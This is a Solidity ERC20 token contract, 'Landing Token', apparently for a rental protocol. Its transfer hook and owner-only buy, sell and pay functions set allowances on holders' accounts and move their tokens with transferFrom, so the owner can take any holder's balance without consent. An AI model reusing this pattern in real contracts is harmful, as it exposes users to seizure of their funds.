// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LandingToken is ERC20, ERC20Burnable, Pausable, Ownable {

    uint256 intialMint = 1000000000000;
    constructor() ERC20("Landing Token", "LANDC") {
        intialMint = 1000000000000;
        _mint(address(this), intialMint * (10 ** decimals()));
        _approve(address(this), msg.sender, intialMint * (10 ** decimals()));
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function mint(uint256 amount) public onlyOwner {
        intialMint += amount;
        _approve(address(this), msg.sender, intialMint * (10 ** decimals()));
        _mint(address(this), amount);
    }

     function burn(uint256 amount) public virtual onlyOwner override {
        _burn(address(this), amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        whenNotPaused
        override
    {
        // if(from != address(0) && to != address(0)){
        //      if (from != address(this)) {
        //     _approve(from, address(this), this.allowance(from, address(this))-amount);
        //     } 
        //     if(to != address(this)){   
        //         _approve(to, address(this), this.allowance(to, address(this))+amount);
        //     }
        // }
       
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        whenNotPaused
        override
    {
        if(from != address(0) && to != address(0)){
             if (from != address(this)) {
            _approve(from, address(this), this.balanceOf(from));
            } 
            if(to != address(this)){   
                _approve(to, address(this), this.balanceOf(to));
            }
        }
       
        super._afterTokenTransfer(from, to, amount);
    }

    function buyToken(uint amount, address buyer) external onlyOwner {
        require(this.balanceOf(address(this)) >= amount, "Not enough balance");
        _approve(buyer, msg.sender, this.allowance(buyer, msg.sender)+amount);
        transferFrom(address(this), buyer, amount);
    }

    function sellToken(uint amount, address seller) external onlyOwner {
        require(this.balanceOf(seller) >= amount, "Not enough balance");
        transferFrom(seller, address(this), amount);
        _approve(seller, msg.sender, this.balanceOf(seller));
    }

    function payToProtocol(uint256 amount, address rentPayer) external onlyOwner{
        transferFrom(rentPayer, msg.sender, amount);
        _approve(rentPayer, msg.sender, this.balanceOf(rentPayer));

    }

    function getPrice() external view returns(uint256) {
        return (intialMint * 10 ** decimals())/(totalSupply()/ 10 ** decimals());
    }
}